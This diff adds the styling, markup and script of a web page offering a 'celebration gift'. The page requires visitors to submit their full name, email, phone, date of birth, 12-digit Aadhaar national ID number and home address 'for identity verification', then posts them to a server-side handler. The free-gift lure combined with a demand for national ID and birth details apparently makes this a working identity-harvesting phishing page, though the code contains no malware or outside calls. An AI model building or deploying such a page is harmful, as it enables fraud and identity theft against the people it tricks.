+      color: rgba(255, 255, 255, 0.75);
+      margin-bottom: 0.35rem;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+    .gift-field label .req {
+      color: #f87171;
+      margin-left: 2px;
+    }
+    .gift-input,
+    .gift-textarea {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      border-radius: 10px;
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.875rem;
+      padding: 0.65rem 0.9rem;
+      outline: none;
+      transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
+    }
+    .gift-input::placeholder,
+    .gift-textarea::placeholder { color: rgba(255,255,255,0.28); }
+    .gift-input:focus,
+    .gift-textarea:focus {
+      border-color: #a78bfa;
+      background: rgba(167, 139, 250, 0.1);
+      box-shadow: 0 0 0 3px rgba(167, 139, 250, 0.18);
+    }
+    .gift-input.invalid,
+    .gift-textarea.invalid {
+      border-color: #f87171;
+      box-shadow: 0 0 0 3px rgba(248, 113, 113, 0.18);
+    }
+    .gift-textarea {
+      resize: vertical;
+      min-height: 88px;
+    }
+    .gift-consent {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.65rem;
+      margin-top: 0.25rem;
+    }
+    .gift-consent input[type="checkbox"] {
+      width: 17px;
+      height: 17px;
+      flex-shrink: 0;
+      margin-top: 2px;
+      accent-color: #a78bfa;
+      cursor: pointer;
+    }
+    .gift-consent span {
+      font-size: 0.82rem;
+      color: rgba(255, 255, 255, 0.60);
+      line-height: 1.5;
+    }
+    .gift-consent span a {
+      color: #c084fc;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+    }
+    .gift-btn {
+      width: 100%;
+      margin-top: 1.5rem;
+      padding: 0.82rem 1.5rem;
+      border: none;
+      border-radius: 12px;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: 0.02em;
+      background: linear-gradient(135deg, #7c3aed, #9333ea, #c026d3);
+      color: #fff;
+      box-shadow: 0 4px 20px rgba(124, 58, 237, 0.45);
+      transition: transform 0.22s ease, box-shadow 0.22s ease, opacity 0.22s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    .gift-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(124, 58, 237, 0.55);
+    }
+    .gift-btn:active:not(:disabled) { transform: translateY(0); }
+    .gift-btn:disabled { opacity: 0.55; cursor: not-allowed; }
+    .gift-btn .btn-spinner {
+      display: none;
+      width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: gSpin 0.65s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+    @keyframes gSpin { to { transform: rotate(360deg); } }
+    .gift-alert {
+      display: none;
+      border-radius: 10px;
+      padding: 0.75rem 1rem;
+      font-size: 0.85rem;
+      margin-top: 1rem;
+      text-align: center;
+      font-weight: 500;
+    }
+    .gift-alert.success {
+      background: rgba(52, 211, 153, 0.15);
+      border: 1px solid rgba(52, 211, 153, 0.35);
+      color: #6ee7b7;
+    }
+    .gift-alert.error {
+      background: rgba(248, 113, 113, 0.13);
+      border: 1px solid rgba(248, 113, 113, 0.35);
+      color: #fca5a5;
+    }
+    .gift-divider {
+      text-align: center;
+      font-size: 0.72rem;
+      color: rgba(255,255,255,0.25);
+      letter-spacing: 0.08em;
+      margin-bottom: 1.75rem;
+      text-transform: uppercase;
+    }
+    .gift-divider::before,
+    .gift-divider::after {
+      content: '';
+      display: inline-block;
+      width: 60px;
+      height: 1px;
+      background: rgba(255,255,255,0.15);
+      vertical-align: middle;
+      margin: 0 0.5rem;
+    }
+
+    /* ══════════════════════════════════════════════════════════
+       GIFT FORM — LIGHT MODE OVERRIDES
+       Activated when <html> carries the .light class
+       ══════════════════════════════════════════════════════════ */
+    html.light .gift-card {
+      background: rgba(255, 255, 255, 0.82);
+      border-color: rgba(124, 58, 237, 0.18);
+      box-shadow:
+        0 8px 40px rgba(0, 0, 0, 0.08),
+        0 0 0 1px rgba(124, 58, 237, 0.07),
+        inset 0 1px 0 rgba(255, 255, 255, 0.95);
+    }
+    html.light .gift-card:hover {
+      box-shadow:
+        0 16px 48px rgba(124, 58, 237, 0.16),
+        0 0 0 1px rgba(124, 58, 237, 0.12),
+        inset 0 1px 0 rgba(255, 255, 255, 0.98);
+    }
+    html.light .gift-desc {
+      color: #374151;
+    }
+    html.light .gift-field label {
+      color: #374151;
+    }
+    html.light .gift-input,
+    html.light .gift-textarea {
+      background: rgba(255, 255, 255, 0.85);
+      border-color: rgba(124, 58, 237, 0.22);
+      color: #1e1b4b;
+    }
+    html.light .gift-input::placeholder,
+    html.light .gift-textarea::placeholder {
+      color: #9ca3af;
+    }
+    html.light .gift-input:focus,
+    html.light .gift-textarea:focus {
+      border-color: #7c3aed;
+      background: rgba(255, 255, 255, 0.97);
+      box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.14);
+    }
+    html.light .gift-consent span {
+      color: #4b5563;
+    }
+    html.light .gift-consent span a {
+      color: #7c3aed;
+    }
+    html.light .gift-divider {
+      color: #9ca3af;
+    }
+    html.light .gift-divider::before,
+    html.light .gift-divider::after {
+      background: rgba(0, 0, 0, 0.12);
+    }
+    /* notice box — !important overrides the inline style */
+    html.light .gift-notice {
+      background: rgba(124, 58, 237, 0.07) !important;
+      border-color: rgba(124, 58, 237, 0.30) !important;
+      color: #4c1d95 !important;
+    }
+    html.light .gift-alert.success { color: #065f46; }
+    html.light .gift-alert.error   { color: #991b1b; }
+  </style>
+
+  <section class="gift-section" id="gift-request">
+    <div class="gift-card">
+
+      <!-- Header -->
+      <h2 class="gift-title">🎁 Claim Your Celebration Gift</h2>
+      <p class="gift-desc">
+        To receive your celebration gift, please enter <strong>your own details</strong> below.<br>
+        Your information will be used solely for identity verification and delivery coordination.
+      </p>
+      <div class="gift-notice" style="background:rgba(99,102,241,0.13);border:1px solid rgba(99,102,241,0.38);border-radius:10px;padding:0.85rem 1.1rem;margin-bottom:1.2rem;color:rgba(255,255,255,0.87);font-size:0.82rem;line-height:1.6;">
+        &#8505;&#65039; <strong>Please Note:</strong> We collect these details only to verify that you are an authorized person. After successful verification, we will proceed with sending your gift.
+      </div>
+      <div class="gift-divider">Secure Form</div>
+
+      <!-- Form -->
+      <form id="giftForm" novalidate autocomplete="off">
+        <input type="hidden" id="giftCsrf" name="csrf_token" value="">
+
+        <div class="gift-grid">
+
+          <!-- Full Name -->
+          <div class="gift-field">
+            <label for="gf_name">Full Name <span class="req">*</span></label>
+            <input class="gift-input" type="text" id="gf_name" name="full_name"
+              placeholder="e.g. Priya Sharma" maxlength="120" required>
+          </div>
+
+          <!-- Email -->
+          <div class="gift-field">
+            <label for="gf_email">Email Address <span class="req">*</span></label>
+            <input class="gift-input" type="email" id="gf_email" name="email"
+              placeholder="you@example.com" maxlength="180" required>
+          </div>
+
+          <!-- Phone -->
+          <div class="gift-field">
+            <label for="gf_phone">Phone Number <span class="req">*</span></label>
+            <input class="gift-input" type="tel" id="gf_phone" name="phone"
+              placeholder="e.g. 9856595621" maxlength="15" required>
+          </div>
+
+          <!-- Date of Birth -->
+          <div class="gift-field">
+            <label for="gf_dob">Date of Birth <span class="req">*</span></label>
+            <input class="gift-input" type="date" id="gf_dob" name="dob" required>
+          </div>
+
+          <!-- Aadhaar -->
+          <div class="gift-field">
+            <label for="gf_aadhaar">Aadhaar Number <span class="req">*</span></label>
+            <input class="gift-input" type="text" id="gf_aadhaar" name="aadhaar"
+              placeholder="12-digit Aadhaar" maxlength="12" inputmode="numeric"
+              pattern="\d{12}" required>
+          </div>
+
+          <!-- Delivery Address -->
+          <div class="gift-field gift-col-full">
+            <label for="gf_address">Delivery Address <span class="req">*</span></label>
+            <textarea class="gift-textarea" id="gf_address" name="address"
+              placeholder="House No., Street, City, State, PIN Code" maxlength="500" required></textarea>
+          </div>
+
+          <!-- Gift Message -->
+          <div class="gift-field gift-col-full">
+            <label for="gf_message">Gift Message <span style="color:rgba(255,255,255,0.35);font-weight:400">(optional)</span></label>
+            <textarea class="gift-textarea" id="gf_message" name="gift_message"
+              placeholder="Write a warm personal message for the recipient…" maxlength="400"></textarea>
+          </div>
+
+          <!-- Consent -->
+          <div class="gift-field gift-col-full">
+            <div class="gift-consent">
+              <input type="checkbox" id="gf_consent" name="consent" required>
+              <span>
+                I agree to the processing of my information for gift delivery purposes.
+                By submitting this form, I consent to the collection of the above details,
+                including Aadhaar, strictly for identity verification and delivery coordination.
+              </span>
+            </div>
+          </div>
+
+        </div><!-- /gift-grid -->
+
+        <!-- Submit -->
+        <button class="gift-btn" type="submit" id="giftSubmitBtn">
+          <span class="btn-spinner" id="giftSpinner"></span>
+          <span id="giftBtnText">Verify &amp; Claim Gift</span>
+        </button>
+
+        <!-- Alert -->
+        <div class="gift-alert" id="giftAlert"></div>
+
+      </form>
+    </div><!-- /gift-card -->
+  </section>
+  <!-- ══ END GIFT REQUEST SECTION ══════════════════════════════════ -->
+
+  <script>
+  /* ── Gift Request Form JS ─────────────────────────────────── */
+  (function () {
+    'use strict';
+
+    const form    = document.getElementById('giftForm');
+    const csrfEl  = document.getElementById('giftCsrf');
+    const alertEl = document.getElementById('giftAlert');
+    const btn     = document.getElementById('giftSubmitBtn');
+    const spinner = document.getElementById('giftSpinner');
+    const btnText = document.getElementById('giftBtnText');
+
+    /* Set DOB max to today to prevent future dates */
+    var dobEl = document.getElementById('gf_dob');
+    if (dobEl) dobEl.max = new Date().toISOString().split('T')[0];
+
+    /* Fetch CSRF token from server when section is visible */
+    fetch('handlers/get_csrf_token.php')
+      .then(function (r) { return r.json(); })
+      .then(function (d) { if (d.token) csrfEl.value = d.token; })
+      .catch(function () {});
+
+    /* ── Field-level validation ────────────────────────────── */
+    function validateField(el) {
+      var ok = true;
+      var val = el.value.trim();
+
+      el.classList.remove('invalid');
+
+      if (el.required && val === '') {
+        ok = false;
+      } else if (el.type === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) {
+        ok = false;
+      } else if (el.id === 'gf_aadhaar' && !/^\d{12}$/.test(val.replace(/\s/g, ''))) {
+        ok = el.value === '';   /* allow empty only if optional; here required */
+        if (val !== '') ok = false;
+      } else if (el.id === 'gf_phone' && val !== '' && !/^\+?[\d\s\-()]{10,15}$/.test(val)) {
+        ok = false;
+      } else if (el.id === 'gf_dob') {
+        var dob = new Date(val);
+        var today = new Date(); today.setHours(0,0,0,0);
+        var minDob = new Date(); minDob.setFullYear(today.getFullYear() - 120);
+        if (!val || isNaN(dob.getTime()) || dob >= today || dob < minDob) ok = false;
+      }
+
+      if (!ok) el.classList.add('invalid');
+      return ok;
+    }
+
+    /* Attach blur listeners */
+    form.querySelectorAll('.gift-input, .gift-textarea').forEach(function (el) {
+      el.addEventListener('blur', function () { validateField(el); });
+    });
+
+    /* ── Show alert helper ─────────────────────────────────── */
+    function showAlert(type, msg) {
+      alertEl.className = 'gift-alert ' + type;
+      alertEl.textContent = msg;
+      alertEl.style.display = 'block';
+    }
+
+    /* ── Submit ────────────────────────────────────────────── */
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      /* Validate all required fields */
+      var allOk = true;
+      form.querySelectorAll('.gift-input, .gift-textarea').forEach(function (el) {
+        if (!validateField(el)) allOk = false;
+      });
+
+      /* Consent check */
+      var consentEl = document.getElementById('gf_consent');
+      if (!consentEl.checked) {
+        allOk = false;
+        consentEl.style.outline = '2px solid #f87171';
+        showAlert('error', 'Please agree to the consent notice before submitting.');
+        return;
+      } else {
+        consentEl.style.outline = '';
+      }
+
+      if (!allOk) {
+        showAlert('error', 'Please fill in all required fields correctly.');
+        return;
+      }
+
+      /* Loading state */
+      btn.disabled = true;
+      spinner.style.display = 'inline-block';
+      btnText.textContent = 'Verifying…';
+      alertEl.style.display = 'none';
+
+      /* Build FormData */
+      var fd = new FormData(form);
+
+      /* AJAX submit */
+      fetch('handlers/gift_handler.php', {
+        method: 'POST',
+        body: fd,
+      })
+        .then(function (res) { return res.json(); })
+        .then(function (data) {
+          if (data.status === 'success') {
+            showAlert('success', '🎉 ' + data.message);
+            form.reset();
+            /* Refresh CSRF token for next use */
+            fetch('handlers/get_csrf_token.php')
+              .then(function (r) { return r.json(); })
+              .then(function (d) { if (d.token) csrfEl.value = d.token; });
+          } else {
+            showAlert('error', data.message || 'Submission failed. Please try again.');
+          }
+        })
+        .catch(function () {
+          showAlert('error', 'Network error. Please check your connection and try again.');
+        })
+        .finally(function () {
+          btn.disabled = false;
+          spinner.style.display = 'none';
+          btnText.textContent = 'Verify & Claim Gift';
+        });
+    });
+  })();
+  </script>
+
+</body>
+</html>
